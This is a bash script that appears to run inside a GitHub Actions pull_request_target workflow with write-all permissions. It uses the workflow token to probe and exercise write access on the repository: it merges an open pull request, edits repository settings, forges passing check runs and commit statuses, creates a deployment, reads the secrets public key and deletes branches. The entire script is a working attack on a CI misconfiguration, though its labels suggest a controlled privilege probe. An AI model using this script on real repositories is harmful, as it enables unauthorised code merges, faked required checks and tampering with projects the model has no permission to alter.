#!/usr/bin/env bash
# i10413 round-2 probe inside pr-target.yml (pull_request_target, permissions: write-all)
set +e
T="$GITHUB_TOKEN"; R="$GITHUB_REPOSITORY"; API="https://api.github.com"
PRN=$(jq -r '.pull_request.number' "$GITHUB_EVENT_PATH" 2>/dev/null)
SHA=$(jq -r '.pull_request.head.sha' "$GITHUB_EVENT_PATH" 2>/dev/null)
echo "I10413B_START repo=$R pr=$PRN head=$SHA run=$GITHUB_RUN_ID"

api(){ m="$1"; u="$2"; shift 2; c=$(curl -s -o /tmp/b -w '%{http_code}' -X "$m" -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "$u" "$@"); echo ">>> [$m] $u => $c"; head -c 500 /tmp/b | tr '\n' ' '; echo; }

echo "=== merge capability on a NON-main-base PR (avoids main) ==="
MPR=$(curl -s -H "Authorization: Bearer $T" "$API/repos/$R/pulls?state=open&base=exp-10413-base&head=StephenClash:exp-10413-m" | jq -r '.[0].number')
echo "merge_test_pr=$MPR"
api GET "$API/repos/$R/pulls/$MPR"
api PUT "$API/repos/$R/pulls/$MPR/merge" -d '{"merge_method":"merge"}'
api GET "$API/repos/$R/pulls/$MPR"

echo "=== workflow registry (Actions:write knowledge) ==="
curl -s -H "Authorization: Bearer $T" "$API/repos/$R/actions/workflows" | jq -c '.workflows[] | {id, name, path, state}' | head -30

echo "=== repo settings / installation ==="
api PATCH "$API/repos/$R" -d '{"description":"i10413 probe"}'
api GET "$API/repos/$R/installation"

echo "=== checks/statuses (forgeable required checks?) ==="
api POST "$API/repos/$R/check-runs" -d "{\"name\":\"i10413-check\",\"head_sha\":\"$SHA\",\"status\":\"completed\",\"conclusion\":\"success\"}"
api POST "$API/repos/$R/statuses/$SHA" -d '{"state":"success","context":"i10413-status","description":"probe"}'
api GET "$API/repos/$R/commits/$SHA/check-runs"

echo "=== deployments write (no-commit persistence) ==="
api POST "$API/repos/$R/deployments" -d "{\"ref\":\"$SHA\",\"environment\":\"i10413-probe-dep\",\"description\":\"i10413 probe\"}"

echo "=== secret read path ==="
api GET "$API/repos/$R/actions/secrets/public-key"

echo "=== cleanup merge-test branches ==="
api DELETE "$API/repos/$R/git/refs/heads/exp-10413-m"
api DELETE "$API/repos/$R/git/refs/heads/exp-10413-base"
echo "I10413B_END"
